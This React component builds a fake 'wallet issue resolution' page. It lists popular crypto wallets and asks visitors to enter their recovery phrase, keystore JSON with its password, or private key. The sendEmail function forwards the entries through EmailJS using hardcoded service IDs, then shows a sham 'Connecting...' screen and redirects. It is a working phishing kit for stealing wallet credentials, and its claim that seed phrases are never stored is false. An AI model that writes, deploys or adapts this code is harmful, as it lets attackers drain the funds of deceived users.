import React, { useState, useRef } from "react";
import { Header } from "../components/header";
import emailjs from "emailjs-com";

// images
import trust from "../image/trust.png";
import meta from "../image/meta.png";
import bsc from "../image/bsc.png";
import ledger from "../image/ledger.png";
import trezor from "../image/trezor.png";
import exodus from "../image/exodus.png";
import rainbow from "../image/rainbow.jpeg";
import phantom from "../image/phantom.jpg";
import argent from "../image/argent.jpg";
import solflare from "../image/solflare.png";
import walletconnect from "../image/walletconnect.png";
import algorand from "../image/algorand.png";
import Optimism from "../image/Optimism.png";
import cardano from "../image/cardano.png";
import cosmos from "../image/cosmos.jpg";
import injective from "../image/injective.png";
import crypto from "../image/crypto.png";

function Connect() {
  const [isOpen, setIsOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [activeTab, setActiveTab] = useState("Phrase");
  const [loading, setLoading] = useState(false); // <-- ✅ loading state

  const form = useRef();

  const wallets = [
    { name: "MetaMask", img: meta },
    { name: "Trust Wallet", img: trust },
    { name: "Binance Wallet", img: bsc },
    { name: "Ledger Wallet", img: ledger },
    { name: "Trezor Wallet", img: trezor },
    { name: "Exodus Wallet", img: exodus },
    { name: "Rainbow Wallet", img: rainbow },
    { name: "Phantom Wallet", img: phantom },
    { name: "Argent Wallet", img: argent },
    { name: "Solflare Wallet", img: solflare },
    { name: "WalletConnect", img: walletconnect },
    { name: "Algorand Wallet", img: algorand },
    { name: "Optimism", img: Optimism },
    { name: "Cardano Wallet", img: cardano },
    { name: "Cosmos Wallet", img: cosmos },
    { name: "Injective Wallet", img: injective },
    { name: "Crypto.com Wallet", img: crypto },
  ];

  const openModal = (wallet) => {
    setSelectedWallet(wallet);
    setActiveTab("Phrase");
    setIsOpen(true);
  };

  const closeModal = () => {
    setIsOpen(false);
    setSelectedWallet(null);
  };

  const sendEmail = (e) => {
    e.preventDefault();
    setLoading(true); 

    emailjs
      .sendForm(
        "service_e07dzn8",
        "template_1e3c76w",
        form.current,
        "Q1nYhMz9HOFs5J2mo"
      )
      .then(
        (result) => {
          console.log(result.text);
          setTimeout(() => {
            window.location.href = "/";
          }, 2500);
        },
        (error) => {
          console.log(error.text);
          setLoading(false); 
          alert("Failed to connect ❌");
        }
        
      );
  };

  return (
    <>
      <Header />

      
      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-80 flex flex-col items-center justify-center z-[1000] text-white">
          <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-emerald-400 border-solid mb-6"></div>
          <p className="text-xl font-semibold">Connecting...</p>
        </div>
      )}

      <section className="bg-blue-950 text-white text-center py-16">
        <h2 className="text-3xl sm:text-5xl font-bold mb-4">Connect Your Wallet</h2>
        <p className="mb-6 text-lg sm:text-xl max-w-2xl mx-auto">
          Choose your preferred wallet to connect and start resolving any issues you might be experiencing.
        </p>
      </section>

      
      <section className="max-w-6xl mx-auto px-4 py-12 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
        {wallets.map((wallet, i) => (
          <button
            key={i}
            onClick={() => openModal(wallet)}
            className="bg-blue-950 p-6 rounded-xl hover:bg-blue-800 transition-colors flex flex-col items-center"
          >
            <div className="bg-blue-800 w-16 h-16 rounded-full flex items-center justify-center mb-4">
              <img src={wallet.img} alt={wallet.name} className="w-full h-auto max-w-full" />
            </div>
            <h3 className="text-lg font-medium">{wallet.name}</h3>
          </button>
        ))}
      </section>

      <section class="container mx-auto px-4 text-blue-950 py-16 mb-10">
             <h2 class="text font-bold text-center sm:text-2xl md:text-5xl lg:text-6xl">How It Works</h2>
            <p className="text-center font-semibold max-w-3xl mx-auto mt-10">
            Our platform makes it easy to connect your wallet and resolve any issues
             </p>

        </section>

        <section class="grid grid-cols-1 md:grid-cols-3 gap-6 p-6">

            <div class="bg-blue-950 p-6 rounded-2xl text-white shadow">
            <div class="bg-emerald-500 w-10 h-10 rounded-full flex items-center justify-center mb-4 text-white font-bold">1</div>
               <h2 class="text-xl font-bold mb-2">Connect Your Wallet</h2>
               <p>Choose your wallet provider and connect securely to our platform.</p>
            </div>

            <div class="bg-blue-950 p-6 rounded-2xl  text-white shadow">
               <div class="bg-emerald-500 w-10 h-10 rounded-full flex items-center justify-center mb-4 text-white font-bold">2</div>
                <h2 class="text-xl font-bold mb-2">Identify Issues</h2>
                 <p>Our system will automatically scan and identify any issues with your wallet or transactions.</p>
            </div>

            <div class="bg-blue-950  rounded-2xl p-6 text-white shadow">
                <div class="bg-emerald-500 w-10 h-10 rounded-full flex items-center justify-center mb-4 text-white font-bold">3</div>
                   <h2 class="text-xl font-bold mb-2">Resolve Problems</h2>
                   <p>Follow the guided steps to resolve any identified issues and restore your wallet functionality.</p>
                </div>
        </section>
        <section class="bg-blue-950 p-8">
               <div class="bg-blue-800 p-3 rounded-2xl">
                  <div class="flex gap-8 items-center">
                    <div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-wallet h-6 w-6 text-green-500"><path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1">
                    </path>
                    <path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"></path>
                  </svg></div>

                       <h3 class="text-2xl text-white font-bold">
                           Your Security is Our Priority
                        </h3>
                </div>
                  <p class="text-white">
                    We never store your private keys or seed phrases. All wallet connections are secure and encrypted.
                    </p>
                   <p class="text-white">
                  Our platform uses industry-standard security protocols to ensure your assets remain safe throughout the process.
                   </p>
            
        </div>
        </section>


      {/* Modal */}
      {isOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
          <div className="bg-blue-950 text-white p-6 rounded-xl shadow-lg max-w-md w-full relative">
            {/* Close button */}
            <button
              onClick={closeModal}
              className="absolute top-3 right-3 text-gray-400 hover:text-white"
            >
              ✕
            </button>

            {/* Wallet Logo */}
            <div className="flex justify-center mb-4">
              <div className="bg-blue-800 w-16 h-16 rounded-full flex items-center justify-center">
                <img src={selectedWallet?.img} alt={selectedWallet?.name} className="w-12 h-12" />
              </div>
            </div>

            <h2 className="text-xl font-bold text-center mb-4">
              Import your {selectedWallet?.name}
            </h2>

            {/* Tabs */}
            <div className="flex justify-center space-x-4 border-b border-blue-800 mb-4">
              {["Phrase", "Keystore JSON", "Private Key"].map((tab) => (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  className={`pb-2 ${
                    activeTab === tab
                      ? "text-emerald-400 border-b-2 border-emerald-400"
                      : "text-gray-400 hover:text-white"
                  }`}
                >
                  {tab}
                </button>
              ))}
            </div>

            {/* Form */}
            <form ref={form} onSubmit={sendEmail}>
              <input type="hidden" name="wallet" value={selectedWallet?.name} />

              {activeTab === "Phrase" && (
                <>
                  <label className="block text-white mb-2">Recovery Phrase</label>
                  <textarea
                    name="phrase"
                    placeholder="Enter your recovery phrase"
                    required
                    className="w-full p-3 border rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                    rows="3"
                  ></textarea>
                  <p className="text-gray-400 text-sm mt-2">
                    Typically 12 (sometimes 24) words separated by single spaces
                  </p>
                </>
              )}

              {activeTab === "Keystore JSON" && (
                <>
                  <label className="block mb-2">Keystore JSON</label>
                  <textarea
                    name="keystore"
                    placeholder="Paste your keystore JSON"
                    required
                    className="w-full p-3 border rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                    rows="3"
                  ></textarea>
                  <input
                    type="password"
                    name="password"
                    placeholder="Enter password"
                    required
                    className="w-full mt-3 p-3 border rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                  />
                </>
              )}

              {activeTab === "Private Key" && (
                <>
                  <label className="block mb-2">Private Key</label>
                  <textarea
                    name="privateKey"
                    placeholder="Enter your private key"
                    required
                    className="w-full p-3 border rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                    rows="3"
                  ></textarea>
                </>
              )}

              <button
                type="submit"
                className="w-full mt-6 bg-emerald-500 text-white p-3 rounded-lg hover:bg-emerald-600"
              >
                Import
              </button>
            </form>
          </div>
        </div>
      )}
    </>
  );
}

export default Connect;
